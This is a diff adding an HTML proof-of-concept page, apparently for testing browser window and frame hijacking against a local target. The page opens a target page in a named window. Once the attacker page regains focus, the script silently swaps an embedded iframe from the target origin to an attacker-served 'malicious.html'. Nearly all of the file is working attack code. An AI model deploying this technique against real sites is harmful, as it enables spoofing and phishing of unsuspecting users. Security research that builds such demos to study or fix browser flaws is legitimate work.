@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Attacker-Controlled Page</title>
+</head>
+<body>
+    <h1>Attacker's Control Page</h1>
+    <p>This is the attacker's page. Click the button to open the target page in a new context.</p>
+    <button id="openTarget">Open Target Page</button>
+    <!-- Iframe points to a 404 page on the target origin -->
+    <iframe id="hijackFrame" name="targetWindow" src="http://127.0.0.1:8001/target/404.html" width="600" height="400">
+    </iframe>
+    <script>
+        document.getElementById('hijackFrame').onload = () => {
+            console.log('Iframe loaded initial target 404 page.');
+        };
+
+        let targetWindow;
+
+        // Open the target page in a named tab or window called "targetPage"
+        document.getElementById('openTarget').onclick = () => {
+            targetWindow = window.open('http://127.0.0.1:8001/target/index.html', 'targetPage');  
+            console.log('Target page opened in named window "targetPage".');
+        };
+
+        // Track focus and popup status
+        let popupOpened = false;
+        let hijackTriggered = false;
+
+        // Trigger hijack when the attacker page gains focus again
+        window.onfocus = () => {
+            if (popupOpened && !hijackTriggered) {
+                hijackTriggered = true;
+                console.log('Window gained focus, triggering hijack to malicious.html');
+                document.getElementById('hijackFrame').src = 'http://127.0.0.1:8000/attacker/malicious.html';
+            }
+        };
+
+        // Detect when the window loses focus, indicating a popup or tab switch
+        window.onblur = () => {
+            console.log('Window lost focus, likely due to popup or tab switch.');
+            popupOpened = true;
+        };
+    </script>
+</body>
+</html>
